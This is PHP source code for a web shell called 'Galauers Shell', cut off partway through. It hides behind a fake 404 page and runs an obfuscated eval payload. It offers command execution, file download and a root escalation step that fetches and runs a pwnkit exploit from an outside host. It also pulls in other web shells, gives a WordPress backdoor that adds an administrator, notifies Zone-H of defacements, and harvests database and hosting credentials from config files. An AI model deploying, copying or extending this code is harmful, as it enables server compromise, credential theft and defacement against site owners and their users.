<?php
session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$_7 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
function login() {
?>
<html>
<head>
    <body>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<style>input { margin:0;background-color:#fff;border:0px}</style>
<form method=post><input type=password name=p></form>
</body></html>
<?php
exit;
}
if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]))
	if(empty($password) || (isset($_7['p']) && (base64_encode($_7['p']) == $password) ) )
		$_SESSION[base64_encode($_SERVER['HTTP_HOST'])] = true;
	else
		login();
// logout
if(isset($_7["left"])) {
	session_start();
	session_destroy();
	echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}
eval(str_rot13(gzinflate(str_rot13(base64_decode("\x6a\x59\71\x66\145\x49\x4d\167\106\x4d\x58\146\x42\57\x73\117\x6c\171\x44\x45\x67\x6b\156\x32\111\154\x41\160\x65\x65\x76\70\163\x78\x65\67\117\x69\x69\x73\x55\157\113\122\112\116\x42\127\161\153\67\104\111\x76\166\x77\122\152\166\127\x65\x6b\x4a\67\x75\x67\146\165\165\142\71\155\162\151\64\61\64\126\x66\x59\141\x30\115\104\143\x6a\125\170\x62\x64\101\103\x4f\64\104\144\x47\x37\167\x49\162\66\71\x74\112\x56\x76\106\x65\x66\x78\x5a\127\x4b\x46\130\x34\123\x5a\x6f\160\121\x49\121\66\x6c\x70\x72\166\x52\x68\132\x43\x46\x6f\166\62\121\x68\114\160\x63\155\114\145\x7a\165\146\123\53\x2b\161\x65\127\x66\x5a\x47\x58\x63\60\x72\101\x41\172\x62\125\x56\x5a\60\x46\115\x79\x55\x43\x6e\x6c\x76\165\57\x66\141\111\120\x55\143\71\156\121\x41\143\71\53\x62\112\x53\124\x45\x2f\x56\x50\122\64\110\x6e\111\x55\165\x43\x55\x75\x49\x38\x62\143\x71\152\101\172\x35\103\x5a\x5a\x2f\x74\x5a\154\x7a\x38\62\154\x48\x35\143\x4a\162\x48\103\126\141\152\110\123\64\155\x30\x4a\124\x34\x44\126\151\x6a\61\167\x43\53\x32\x42\53\x77\x6c\160\x77\146\x4b\130\x68\125\x64\x6b\147\x58\166\126\x74\x51\61\x72\x5a\x5a\132\x41\x37\102\101\x64\101\x66\x2f\120\64\150\x79\x56\x61\62\63\126\116\x6d\x4d\x49\111\x43\x6a\123\154\x47\x61\x50\x76\x6e\152\167\66\147\152\124\x78\62\x4a\152\x73\112\x5a\x4b\53\115\147\126\x6f\x39\x55\151\x41\110\114\157\61\124\x30\x33\57\64\x69\57\x41\124")))));
// download file
if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
	@ob_clean();
	$file = $_7['opn'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<rd>".$perm."</rd>";
	} else {
		return "<gr>".$perm."</gr>";
	}
}
function s(){
	echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$typ = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$typ[$i]);
}
function ia() {
	$ia = '';
if (getenv('HTTP_CLIENT_IP'))
	$ia = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ia = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ia = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ia = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ia = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ia = getenv('REMOTE_ADDR');
else
	$ia = 'Unknown IP';
return $ia;
}
function exe($cmd) {
if(function_exists('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif(function_exists('passthru')) {
	@ob_start();

	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
function exe_root($set,$sad) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $set)) {
		$set = $set." ".$xx;
	}
	$a = "function_exists";
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
		return $d($pink[1]);
	} else {
		return "proc_open function is disabled !";
	}
}
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
}
if(isset($_7['dir'])) {
	$dir = $_7['dir'];
	chdir($dir);
} else {
	$dir = $gcw();
}
echo "
<html>
	<head>
		<meta charset='UTF-8'>
		<meta name='author' content='Rambu Anarki'>
		<meta name='viewport' content='width=device-width, initial-scale=0.50'>
		<link rel='icon' href='//i.ibb.co/x277nty/babiraga.png'>
		<title>Galauers Shell</title>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
		<style>@import url('https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');@import url('https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');@import url('https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');@import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');@import url('https://fonts.googleapis.com/css2?family=Cormorant');body {font-family:'Ubuntu Condensed';}.shell{border-radius: 4px;border: 1px solid rgba(255, 255, 255, 0.4);font-size: 10pt;display: flex;flex-direction: column;align-items: stretch;background: #242424;color: #fff;}.pre{height: 150px;overflow: auto;white-space: pre-wrap;flex-grow: 1;margin:10px auto;padding:10px;line-height:1.3em;overflow-x:scroll;}.anu,kbd{font-family:'Cormorant';}.corner{text-align: right;margin-top: -10px;font-size:12px;}gr {color:#54A700;}rd {color:red;}.php_info pre {margin: 0; font-family: monospace;}.php_info table {color: #000; border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}.center {text-align: center;}.center table {margin: 1em auto; text-align: left;}.center th {text-align: center !important;}.php_info td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}.p {text-align: left;}.e {background-color: #ccf; width: 300px; font-weight: bold;}.h {background-color: #99c; font-weight: bold;}.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}.v i {color: #999;}img {float: right; border: 0;}hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}h1 {font-size: 150%;}h2 {font-size: 125%;}</style>
	</head>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h1>Still Galau!</h1></a>";
			if(isset($_7['path'])){
				$path = $_7['path'];
				chdir($path);
			}else{
				$path = $gcw();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
					echo "<i class='bi bi-hdd-rack'></i>:<a class='text-decoration-none text-light' href='?path=/'>/</a>";
				continue;
			}
			if($pat == '') continue;
				echo "<a class='text-decoration-none text-light' href='?path=";
				for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
			if($i != $id) echo "/";
			}
			echo "'>".$pat."</a>/";
			}
			$scand = scandir($path);
			echo "&nbsp;[ ".w($path, p($path))." ]";
			// info
			$sql = (function_exists('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$curl = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$wget = (exe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pl = (exe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$py = (exe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$gcc = (exe('gcc --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pkexec = (exe('pkexec --version"')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$disfunc = @ini_get("disable_functions");
			if (empty($disfunc)) {
				$disfc = "<gr>NONE</gr>";
			} else {
				$disfc = "<rd>$disfunc</rd>";
			}
			if(!function_exists('posix_getegid')) {
				$user = @get_current_user();
				$uid = @getmyuid();
				$gid = @getmygid();
				$group = "?";
			} else {
				$uid = @posix_getpwuid(posix_geteuid());
				$gid = @posix_getgrgid(posix_getegid());
				$user = $uid['name'];
				$uid = $uid['uid'];
				$group = $gid['name'];
				$gid = $gid['gid'];
			}
			$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
		echo "
		<div class='container-fluid'>
			<div class='corner anu'>
				<b data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>Information Server</b>
			</div><br>
			<div class='collapse text-dark mb-3' id='collapseExample'>
				<div class='box shadow bg-light p-3 rounded-3'>
				System: <gr>".php_uname()."</gr><br>
				Software: <gr>".$_SERVER["SERVER_SOFTWARE"]."</gr><br>
				PHP Version: <gr>".PHP_VERSION."</gr> PHP Os: <gr>".PHP_OS."</gr><br>
				Server IP: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br>
				Your IP: <gr>".ia()."</gr><br>
				User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
				Safe Mode: $sm<br>
				MYSQL: $sql | PERL: $pl | PYTHON: $py | WGET: $wget | CURL: $curl | GCC: $gcc | PKEXEC: $pkexec<br>
				Disable Function:<br><pre>$disfc</pre>
				</div>
			</div>
		</div>
		<div class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=adminer'><i class='bi bi-cast'></i> Adminer </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=autoroot'><i class='bi bi-bug'></i> Auto Root </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cmd'><i class='bi bi-terminal'></i> Command </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=config'><i class='bi bi-tv'></i> Config </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=get'><i class='bi bi-toggles'></i> Get S/T</a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass Deface </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=delete'><i class='bi bi-trash'></i> Mass Delete </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=network'><i class='bi bi-hdd-network'></i> Network </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=os'><i class='bi bi-eye'></i> OS Release </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=scanroot'><i class='bi bi-search'></i> Scan Root </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=upload'><i class='bi bi-upload'></i> Upload </a>
				<a class='btn btn-outline-light btn-sm' href='?left'><i class='bi bi-box-arrow-in-left'></i> Logout! </a>
			</div>
		</div>";
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		// tools
		if(isset($_7['dir'])) {
			$dir = $_7['dir'];
			chdir($dir);
		} else {
			$dir = $gcw();
		}
		$path = str_replace('\\','/',$path);
		$scdir = explode("/", $dir);	
		for($i = 0; $i <= $c_dir; $i++) {
			$scdir[$i];
			if($i != $c_dir) {
		}
		// os release
		if($_7['id'] == 'os'){
		ob_implicit_flush();ob_end_flush();
		echo '<center class="anu">OS Release</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("cat /etc/os*", $path).'</code></pre>
					</div>
				</div>';
			}
		// auto root
		if($_7['id'] == 'autoroot'){
		ob_implicit_flush();ob_end_flush();
		echo '<center class="anu"Auto Root</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl http://eviltw.in/files/pwnkit.txt -o galau;chmod +x galau;./galau id", $path).'<br>If successful, u can run as root user using command: ./Galauers "YOUR COMMAND"</code></pre>
					</div>
				</div>';
			}
		// get tools
		if($_7['id'] == 'get'){
		ob_implicit_flush();ob_end_flush();s();
		echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wso'><i class='bi bi-peace'></i> Wso Shell </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=alfa'><i class='bi bi-peace'></i> Alfa Tesla Shell </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=marijuana'><i class='bi bi-peace'></i> Marijuana Shell </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wpadd'><i class='bi bi-peace'></i> WP Add Admin </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=shellscan'><i class='bi-peace'></i> Shell Scanner </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=zoneh'><i class='bi bi-peace'></i> Zone-H Notify </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=csrf'><i class='bi bi-peace'></i> CSRF </a>
				</div>
			</div>";
		echo "<b><center class=anu>";
		if(isset($_GET['id_two']) && $_GET['id_two'] == "wso") {
			echo "<center class='anu'>Get Wso Shell<br>";
			function wso($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babiwso.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babiscan.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(wso("https://raw.githubusercontent.com/BOTKNTL/kontol/master/wso425.php","babiwso.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babiwso.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create wso shell</rd>";}
			
		} echo "</center>";
		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "alfa") {
			echo "<center class='anu'>Get Alfa Shell<br>";
			function alfa($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babialfa.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babialfa.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(alfa("https://raw.githubusercontent.com/BOTKNTL/kontol/master/alfatesla.php","babialfa.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babialfa.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create alfa shell</rd>";}}
		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "marijuana") {
			echo "<center class='anu'>Get Marijuana Shell<br>";
			function marijuana($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babimarijuana.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babimarijuana.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(marijuana("https://raw.githubusercontent.com/BOTKNTL/kontol/master/maricoli.php","babimarijuana.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babimarijuana.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create marijuana shell:(</rd>";}
		} echo "</center>";
	} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "zoneh") {
			if($_POST['submit']) {
echo '<center class=anu>';
		$domain = explode("rn", $_POST['url']);
		$nick =  $_POST['nick'];
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match('/color="red">OK</font></li>/i', $zoneh)) {
				echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$url<br>";
			} else {
				echo "[<rd><i class='bi bi-x'></i></rd>]&nbsp;$url<br>";
			} echo "Defacer Archive: <a style=text-decoration:none; href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br>";
			  echo "Defacer Onhold: <a style=text-decoration:none; href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a>";
		}
	} else {
		echo "<div class='card card-body text-dark input-group mb-3'><form method='POST'>
		Attacker : </font><br>
		<input class='form-control btn-sm' type='text' name='nick' size='50' placeholder='Galauers'><br>
		Domains : </font><br>
		<textarea class='form-control btn-sm' rows='7' name='url' placeholder='http://site.gov/Galauers.txt
http://site.edu/Galauers.txt'></textarea><br>
		<input class='btn btn-dark btn-sm' type='submit' name='submit' value='Submit!'>
		</form>";
	}
	echo "</div><br>";
	} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "wpadd") {?>
				<div class='container-fluid language-javascript'>
					<div class='shell mb-3'>
						<pre style='font-size:10px;'><code>function Galauersadmin(){
$login = 'Galauers';
$passw = 'Galauers#1337';
$email = 'g00glesec@proton.me';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','Galauersadmin');</code></pre>
					</div>
					Add the above code in the functions.php file on the target website.<br>
example: https://site.gov/wp-content/themes/[theme name/functions.php
				</div><?php
		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "csrf") {
			echo "<div class='card card-body text-dark input-group mb-3'>
<form method='POST'> Target:<input class='form-control btn-sm' type='text' name='url' size='50' height='10' placeholder='http://victim.com/[PATH]/upload.php' style='margin: 5px auto; padding-left: 5px;' required>
POST File: <input class='form-control btn-sm' type='text' name='pf' size='50' height='10' placeholder='Filedata, dzupload, dzfile, dzfiles, file, ajaxfup, files[], qqfile, userfile' style='margin: 5px auto; padding-left: 5px;' required>
<input class='btn btn-dark btn-sm' type='submit' name='d' value='Lock!'></form>";
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input class='form-control btn-sm' type='file' name='$pf'>
<input class='btn btn-dark btn-sm' type='submit' name='g' value='Upload!'></form></form></div>";}
} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "shellscan") {
	echo "<center class='anu'><b>Get Shell Backdoor Scanner</b><br>";
	function babiscan($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babiscan.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babiscan.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(babiscan("https://pastebin.com/raw/sFt4zd8C","babiscan.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babiscan.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create shell backdoor scanner:(</rd>";}
		} echo "</center>";
	}
		}
		// config grabber
		if($_7['id'] == 'config'){
	echo '<center class="anu"><br><b>Grab Config</b></center>';
	$etc = fopen("/etc/passwd", "r") or die("<rd>can't read /etc/passwd:(</rd>");
	$idx = mkdir("Galauers_CONFIG", 0777);
	$isi_htc = "Options allnRequire NonenSatisfy Any";
	$htc = fopen("Galauers_CONFIG/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<rd>Can't read /etc/passwd:(</rd>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $stillgalau) {
				$user_config_dir = "/home/$stillgalau/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$stillgalau/.my.cnf" => "cpanel",
						"/home/$stillgalau/.accesshash" => "WHM-accesshash",
							"/home/$stillgalau/config/koneksi.php" => "Lokomedia",
							"/home/$stillgalau/forum/config.php" => "phpBB",
							"/home/$stillgalau/sites/default/settings.php" => "Drupal",
							"/home/$stillgalau/config/settings.inc.php" => "PrestaShop",
							"/home/$stillgalau/app/etc/local.xml" => "Magento",
							"/home/$stillgalau/admin/config.php" => "OpenCart",
							"/home/$stillgalau/application/config/database.php" => "Ellislab",
							"/home/$stillgalau/vb/includes/config.php" => "Vbulletin",
							"/home/$stillgalau/includes/config.php" => "Vbulletin",
							"/home/$stillgalau/forum/includes/config.php" => "Vbulletin",
							"/home/$stillgalau/forums/includes/config.php" => "Vbulletin",
							"/home/$stillgalau/cc/includes/config.php" => "Vbulletin",
							"/home/$stillgalau/inc/config.php" => "MyBB",
							"/home/$stillgalau/includes/configure.php" => "OsCommerce",
							"/home/$stillgalau/shop/includes/configure.php" => "OsCommerce",
							"/home/$stillgalau/os/includes/configure.php" => "OsCommerce",
							"/home/$stillgalau/oscom/includes/configure.php" => "OsCommerce",
							"/home/$stillgalau/products/includes/configure.php" => "OsCommerce",
							"/home/$stillgalau/cart/includes/configure.php" => "OsCommerce",
							"/home/$stillgalau/inc/conf_global.php" => "IPB",
							"/home/$stillgalau/wp-config.php" => "Wordpress",
							"/home/$stillgalau/wp/test/wp-config.php" => "Wordpress",
							"/home/$stillgalau/blog/wp-config.php" => "Wordpress",
							"/home/$stillgalau/beta/wp-config.php" => "Wordpress",
							"/home/$stillgalau/portal/wp-config.php" => "Wordpress",
							"/home/$stillgalau/site/wp-config.php" => "Wordpress",
							"/home/$stillgalau/wp/wp-config.php" => "Wordpress",
							"/home/$stillgalau/WP/wp-config.php" => "Wordpress",
							"/home/$stillgalau/news/wp-config.php" => "Wordpress",
							"/home/$stillgalau/wordpress/wp-config.php" => "Wordpress",
							"/home/$stillgalau/test/wp-config.php" => "Wordpress",
							"/home/$stillgalau/demo/wp-config.php" => "Wordpress",
							"/home/$stillgalau/home/wp-config.php" => "Wordpress",
							"/home/$stillgalau/v1/wp-config.php" => "Wordpress",
							"/home/$stillgalau/v2/wp-config.php" => "Wordpress",
							"/home/$stillgalau/press/wp-config.php" => "Wordpress",
							"/home/$stillgalau/new/wp-config.php" => "Wordpress",
							"/home/$stillgalau/blogs/wp-config.php" => "Wordpress",
							"/home/$stillgalau/configuration.php" => "Joomla",
							"/home/$stillgalau/blog/configuration.php" => "Joomla",
							"/home/$stillgalau/submitticket.php" => "^WHMCS",
							"/home/$stillgalau/cms/configuration.php" => "Joomla",
							"/home/$stillgalau/beta/configuration.php" => "Joomla",
							"/home/$stillgalau/portal/configuration.php" => "Joomla",
							"/home/$stillgalau/site/configuration.php" => "Joomla",
							"/home/$stillgalau/main/configuration.php" => "Joomla",
							"/home/$stillgalau/home/configuration.php" => "Joomla",
							"/home/$stillgalau/demo/configuration.php" => "Joomla",
							"/home/$stillgalau/test/configuration.php" => "Joomla",
							"/home/$stillgalau/v1/configuration.php" => "Joomla",
							"/home/$stillgalau/v2/configuration.php" => "Joomla",
							"/home/$stillgalau/joomla/configuration.php" => "Joomla",
							"/home/$stillgalau/new/configuration.php" => "Joomla",
							"/home/$stillgalau/WHMCS/submitticket.php" => "WHMCS",
							"/home/$stillgalau/whmcs1/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Whmcs/submitticket.php" => "WHMCS",
							"/home/$stillgalau/whmcs/submitticket.php" => "WHMCS",
							"/home/$stillgalau/whmcs/submitticket.php" => "WHMCS",
							"/home/$stillgalau/WHMC/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Whmc/submitticket.php" => "WHMCS",
							"/home/$stillgalau/whmc/submitticket.php" => "WHMCS",
							"/home/$stillgalau/WHM/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Whm/submitticket.php" => "WHMCS",
							"/home/$stillgalau/whm/submitticket.php" => "WHMCS",
							"/home/$stillgalau/HOST/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Host/submitticket.php" => "WHMCS",
							"/home/$stillgalau/host/submitticket.php" => "WHMCS",
							"/home/$stillgalau/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Supportes/submitticket.php" => "WHMCS",
							"/home/$stillgalau/supportes/submitticket.php" => "WHMCS",
							"/home/$stillgalau/domains/submitticket.php" => "WHMCS",
							"/home/$stillgalau/domain/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Hosting/submitticket.php" => "WHMCS",
							"/home/$stillgalau/HOSTING/submitticket.php" => "WHMCS",
							"/home/$stillgalau/hosting/submitticket.php" => "WHMCS",
							"/home/$stillgalau/CART/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Cart/submitticket.php" => "WHMCS",
							"/home/$stillgalau/cart/submitticket.php" => "WHMCS",
							"/home/$stillgalau/ORDER/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Order/submitticket.php" => "WHMCS",
							"/home/$stillgalau/order/submitticket.php" => "WHMCS",
							"/home/$stillgalau/CLIENT/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Client/submitticket.php" => "WHMCS",
							"/home/$stillgalau/client/submitticket.php" => "WHMCS",
							"/home/$stillgalau/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Clientarea/submitticket.php" => "WHMCS",
							"/home/$stillgalau/clientarea/submitticket.php" => "WHMCS",
							"/home/$stillgalau/SUPPORT/submitticket.php" => "WHMCS",
